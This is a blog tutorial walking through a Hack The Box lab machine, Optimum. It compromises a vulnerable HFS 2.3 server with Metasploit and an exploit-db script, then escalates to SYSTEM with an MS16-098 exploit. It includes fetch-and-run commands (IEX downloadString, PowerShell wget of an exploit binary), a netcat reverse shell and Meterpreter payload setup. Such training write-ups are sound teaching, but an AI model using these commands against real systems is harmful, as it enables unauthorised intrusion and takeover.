---
title: Keep Calm and Hack The Box - Optimum
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2019-10-11T11:31:04.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-optimum
coverImage: https://www.freecodecamp.org/news/content/images/2019/10/126448-1.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
seo_title: null
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them simulating real world scenarios and some of them leaning more towards a
  CTF style ...
---

Hack The Box (HTB) is an online platform allowing you to test your penetration testing skills. It contains several challenges that are constantly updated. Some of them simulating real world scenarios and some of them leaning more towards a CTF style of challenge.

**Note**. _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.25.52.png)

Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/)

* [nmap](https://nmap.org/)
* [zenmap](https://nmap.org/zenmap/)
* [searchsploit](https://www.exploit-db.com/searchsploit)
* [metasploit](https://www.metasploit.com/)

## Step 1 - Scanning the network

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as you could.

I will use Nmap (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. 

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap)

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.32.54.png)

I use the following command to get a basic idea of what we are scanning

```bash
nmap -sV -O -F --version-light 10.10.10.8
```

**-sV:** Probe open ports to determine service/version info

**-O:** Enable OS detection

**-F:** Fast mode - Scan fewer ports than the default scan

**--version-light:** Limit to most likely probes (intensity 2)

**10.10.10.8:** IP address of the Optimum box

You can also use Zenmap, which is the official Nmap Security Scanner GUI. It is a multi-platform, free and open source application which aims to make Nmap easy for beginners to use while providing advanced features for experienced Nmap users.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.38.49.png)

I use a different set of commands to perform an intensive scan

```bash
nmap -A -v 10.10.10.8
```

**-A:** Enable OS detection, version detection, script scanning, and traceroute

**-v:** Increase verbosity level

**10.10.10.8:** IP address of the Optimum box

If you find the results a little bit too overwhelming, you can move to the **Ports/Hosts** tab to only get the open ports

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.39.54.png)

We can see that there is 1 open port:

**Port** 80. Hypertext Transfer Protocol (HTTP). Here it's an HttpFileServer httpd 2.3

For now, this is our main target

## **Step 2 - Visiting the website**

Let's try the **port 80** and visit **http://10.10.10.8**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.48.59.png)

We can see at the bottom of the page the server information. We have an **HttpFileServer 2.3**

A **HTTP File Server**, also known as HFS, is a free web server specifically designed for publishing and sharing files.

The official documentation describes HFS as:

> HFS (Http File Server) is a file sharing software which allows you to send and receive files. You can limit this sharing to just a few friends, or be open to the whole world. HFS is different from classic file sharing because there is no network. HFS is a web server which uses web technology to be more compatible with today's Internet. Since it is actually a web server, your friends can download files as if they were downloading from a website using a web browser, such as Internet Explorer or Firefox. Your users don't have to install any new software. HFS lets you share your files. Most web servers are used to publish a website, but HFS is not designed to do that. You are, however, free to use it in any way you wish, - but at your own risk.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.50.59.png)
_[https://www.rejetto.com/hfs/](https://www.rejetto.com/hfs/)_

I use **Searchsploit** to check if there is any known vulnerability on HFS. Searchsploit is a command line search tool for **[Exploit Database](https://www.exploit-db.com/)**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-23.04.38.png)

I use the following command

```bash
searchsploit HFS
```

We can see several vulnerabilities, but we will examine the **Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)** with this command

```bash
searchsploit -x 34926.rb
```

We have a summary of the exploit and the code

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-23-at-21.44.27.png)

In the description we can see that the

> Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas. This module exploit the HFS scripting commands by using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.

We can also find the exploit on the Exploit Database website

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-23-at-21.46.49.png)
_[https://www.exploit-db.com/exploits/34926](https://www.exploit-db.com/exploits/34926)_

As well as on the Rapid7 website

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-23-at-21.48.33.png)
_[https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec)_

We know that the version of the application is **HttpFileServer 2.3**

We will use **Metasploit**, which is a penetration testing framework. It's an essential tool for many attackers and defenders

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/)_

I launch **Metasploit Framework** on Kali and look for command I should use to launch the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-23-at-22.04.47.png)

If you want to get more info on the exploit, you can use the following command

```bash
info exploit/windows/http/rejetto_hfs_exec
```

And you will get some detailed information on the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-23-at-22.06.11.png)

I use the following command to use the exploit

```bash
use exploit/windows/http/rejetto_hfs_exec
```

I need to set up several options before launching the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.00.38.png)

I start by setting the **RHOSTS** with the following command

```bash
set RHOSTS 10.10.10.8
```

and I set the **SRHVOST** with

```bash
set SRHVOST 10.10.14.23
```

When I check the options, I get this

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.05.33.png)

I  then run the exploit with the command

```bash
exploit
```

And I get a **Meterpreter** session

From the [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) website, we get this definition for Meterpreter

> Meterpreter is an advanced, dynamically extensible payload that uses _in-memory_ DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.

You can read more about Meterpreter [here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.07.56.png)

Let's start by gathering some information

**getuid** returns the real user ID of the calling process and **sysinfo** returns certain statistics on memory and swap usage, as well as the load average

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.11.30.png)

If we look closely, we can see that Optimum’s architecture is **x64**, but our meterpreter version is set to x86. We will need to change this!

I put this session in the background with the command

```bash
background
```

I check the module options one more time and I see that the payload options are not correctly set up

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.17.10.png)

It is using 

```bash
windows/meterpreter/reverse_tcp
```

instead of

```bash
windows/x64/meterpreter/reverse_tcp
```

I set up the payload with the following command

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.20.25.png)

I get another meterpreter session, and when I check the **sysinfo**, I can see that I have the correct meterpreter version this time, **x64/windows**

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.22.10.png)

## **Step 3 -** Looking for the user.txt flag

Now that I have a session, I can list all the files/folders with the following command

```bash
ls
```

And I find the user flag! I can check the content of the file with

```bash
cat user.txt.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.25.45.png)

I try to navigate to the Administrator folder but got an access is denied message. I need to do a privilege escalation to capture the root.txt flag

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-19.56.27.png)



## **Step 4 - Using Metasploit for privilege escalation** 

I will use the module **post/multi/recon/local_exploiter_suggester**

From the Rapid7 website, I get this

> This module suggests local meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter. It's important to note that not all local exploits will be fired. Exploits are chosen based on these conditions: session type, platform, architecture, and required default options.

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.09.35.png)

I check for the options and I list all the sessions to make sure to pick the right one

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.09.46.png)

I set session 2 to point the exploit at the x64 meterpreter session

```bash
set SESSION 2
```

 and set the description to have a detailed explanation of any suggested exploits

```bash
set SHOWDESCRIPTION true
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.10.05.png)

I launch the exploit but nothing seems to come back

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.10.12.png)

Going back to the second sessions with

```bash
sessions 2
```

and checking sysinfo once again gives us more information on the operating system. We can see it is a Windows 2012 R2

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.13.59.png)

I do a Google search to find any privilege escalation exploit on Windows 2012 R2 and find this exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.16.11.png)
_[https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc)_

As well as the official Microsoft Security Bulletin on MS16-032

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.19.27.png)
_[https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)_

Back on Metasploit, I check if there is any exploit available and I find one with 

```bash
search ms16-032
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.47.07.png)

I check the options and set up the **session**

```bash
set SESSION 3
```

the **LHOST**

```bash
set LHOST 10.10.14.27
```

and the **target** to Windows x64

```bash
set TARGET 1
```

I check the options to see if everything is configured properly

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.44.38.png)

I launch the exploit but it doesn't seem to work anymore. I will need to exploit it manually without the help of Metasploit!

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.44.46.png)



## **Step 5 - Creating a** low privilege reverse shell

Back on searchsploit, I check the results from 

```bash
searchsploit HFS
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.58.57.png)

I can see several vulnerabilities, but I will examine the **'2.3.x - Remote Command Execution (1)'** first with this command

```bash
searchsploit -x 34668.txt
```

I have an explanation of the exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-23.08.17.png)

I then examine the **'2.3.x - Remote Command Execution (2)'** with this command

```bash
searchsploit -x 39161.py
```

I have a summary of the exploit and the code. I then have a look at the code and the description

> You can use HFS (HTTP File Server) to send and receive files. It's different from classic file sharing because it uses web technology to be more compatible with today's Internet. It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux.

Then at the note that explains that it depends on a web server to download and leverage **nc.exe** to get the reverse shell

> You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe)

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-23.10.46.png)

If you check the help section of **searchsploit**, we can copy an exploit to the current directory

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.02.54.png)

I use the following command to copy the file

```bash
searchsploit -m 39161.py
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.03.04.png)

Then I use this command to modify the file

```bash
nano 39161.py
```

and change the hard coded IP address to the one of the attacking machine - my machine in this case

```bash
ip_addr = "10.10.14.27" #local IP address
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.08.49.png)

I create a **www** folder 

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.13.27.png)

and I copy **nc.exe** over

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.13.37.png)

I launch the exploit. On the first window on the top left, I launch a small python server with 

```bash
python -m SimpleHTTPServer 80
```

The **SimpleHTTPServer** module that comes with Python is a simple HTTP server that provides standard GET and HEAD request handlers

The second window on the top right has netcat listening. I set up a **Ncat** listener on port **443** to catch the reverse shell connection

> Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project as a much-improved reimplementation of the venerable [Netcat](http://sectools.org/tool/netcat/). It uses both TCP and UDP for communication and is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users

You can learn more about Ncat [here](https://nmap.org/book/ncat-man.html)

```bash
nc -nvlp 443 10.10.10.8
```

The third window has the python exploit - I had to launch the script twice, one to trigger **nc.exe** and the other to get the reverse shell

The python exploit (3rd window) will connect to the python server (1st window) to download the nc.exe Windows binary. Then nc.exe connects back to the Ncat listener on port 443 (2nd window) and will create a low privilege reverse shell

```bash
python 39161.py 10.10.10.8 80
```

You can check see the user is Kostas on this machine

```bash
C:\Users\kostas\Desktop>
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.22.30.png)

I can then navigate on Kostas machine to get the user flag!

I check who I am on the machine with the command,

```bash
whoami
```

list the files/folders with

```bash
dir
```

and show the user flag content with

```bash
type user.txt.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.28.24.png)

I find the user flag! Let's get the root flag now :)

## **Step 6a - Using** GDSSecurity/**Windows-Exploit-Suggester**

I show the system information with

```bash
systeminfo
```

I copy/paste the findings on a **systeminfo.txt** file

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.55.44.png)

I will use Windows-Exploit-Suggester from [GDSSecurity](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

> This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.

> It requires the 'systeminfo' command output from a Windows host in order to compare that the Microsoft security bulletin database and determine the patch level of the host.

> It has the ability to automatically download the security bulletin database from Microsoft with the --update flag, and saves it as an Excel spreadsheet.

I copy/paste the raw windows-exploit-suggester python script on a file and then modify the file 

```bash
nano windows-exploit-suggester.py
```

to paste the code from the [GitHub repository](https://raw.githubusercontent.com/GDSSecurity/Windows-Exploit-Suggester/master/windows-exploit-suggester.py). We now have our 2 files into the same folder, **systeminfo.txt** and **windows-exploit-suggester.py**

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.45.45.png)

I can find out more about this tool with the following command

```bash
python windows-exploit-suggester.py -h
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.45.56.png)

I update the database of the tool with the following command

```bash
python windows-exploit-suggester.py --update
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.52.56.png)

I run the script with

```bash
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2019-10-08-mssb.xls
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.59.39.png)

I can see that there are several missing CVEs on this machine. I will target the MS16-032 vulnerability

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-22.01.59.png)

## Step 6b - Using Sherlock to enumerate KBs

I will use Sherlock to enumerate the KB on this machine. Sherlock is a PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.

You can learn more on Sherlock [here](https://github.com/rasta-mouse/Sherlock)

When I ran the sysinfo command in **Step 6a**, I could see a list of KBs. KB stands for Knowledge Base. Microsfot defines it as

> The Microsoft Knowledge Base has more than 150,000 articles. These articles were created by thousands of support professionals who have resolved issues for our customers. The Microsoft Knowledge Base is regularly updated, expanded, and refined to help make sure that you have access to the very latest information.

You can learn more on KB [here](https://support.microsoft.com/en-gb/help/242450/how-to-query-the-microsoft-knowledge-base-by-using-keywords-and-query)

I git clone the Sherlock repository to my local and move it to the **www/** folder

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-09-at-23.27.00.png)

I change the file **Sherlock.ps1** and add **Find-Allvulns** at the end of the Powershell script with

```bash
nano Sherlock.ps1
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-09-at-23.29.42.png)

I then use the following command

```bash
wget "http://10.10.14.27//sherlock/Sherlock.ps1"
```

to fetch the file from Kostas' machine

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-09-at-23.28.02.png)

I then launch Sherlock with the following command

```bash
IEX(New-Object Net.Webclient).downloadString('http://10.10.14.27/sherlock/Sherlock.ps1')
```

It will go through all the KB

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-09-at-23.25.18.png)

and returns with which ones are vulnerable

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-09-at-23.31.00.png)

## **Step 7 - Using RGNOBJ Integer Overflow for privilege escalation**

At **Step 6a**, when I got the result back from the Windows Exploit Suggester, one of the exploit targets Windows 8.1 (x64)

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.05.34.png)

If we have a look at the Microsoft documentation, we can see that Windows Server 2012 R2 is related to Windows 8.1 and has the same build number. We can assume the exploit might work as well on it

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-10-at-21.57.48.png)
_[https://docs.microsoft.com/en-gb/windows/win32/sysinfo/operating-system-version?redirectedfrom=MSDN](https://docs.microsoft.com/en-gb/windows/win32/sysinfo/operating-system-version?redirectedfrom=MSDN)_

I look on **searchsploit**

```bash
searchsploit m16-098
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.08.45.png)

I can also find it on the Exploit Database website

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.08.01.png)
_[https://www.exploit-db.com/exploits/41020](https://www.exploit-db.com/exploits/41020)_

I use the following command to copy the file

```bash
searchsploit -m 41020.c
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.10.30.png)

The exploit needs to be compiled before it can be executed. I check the code with

```bash
cat 41020.c
```

I can see in the comments that the exploit has a pre-compiled Windows binary available that can be used

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.13.59.png)

I copy the exploit with the **wget** command and move the file to my **www** folder

```bash
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.19.11.png)

I set up another python server - I kill the previous one. 

```bash
python -m SimpleHTTPServer 80
```

On the other window, on Kostas machine I use powershell to download the exploit

```bash
powershell wget "http://10.10.14.27/41020.exe" -outfile "exploit.exe"
```

I then execute the exploit with

```bash
exploit.exe
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.24.54.png)

I can see that the privilege escalation was a success by checking who I am on the machine

```bash
whoami
```

 It returns

```bash
nt authority\system
```

I am admin

Let's find the root flag now! I navigate up to Users and check in to the Administrator/Desktop folder. I find the flag!

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.28.14.png)

I use the following command to see the content of the file

```bash
type root.txt
```

Congrats! You found both flags!

---

Please don’t hesitate to comment, ask questions or share with your friends :)

You can see more of my articles [here](https://www.freecodecamp.org/news/author/sonya/)

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

---

**Other Hack The Box articles**

* [Keep Calm and Hack The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Keep Calm and Hack The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Keep Calm and Hack The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)
* [Keep Calm and Hack The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)

![Image](https://www.freecodecamp.org/news/content/images/2019/10/126448.jpg)

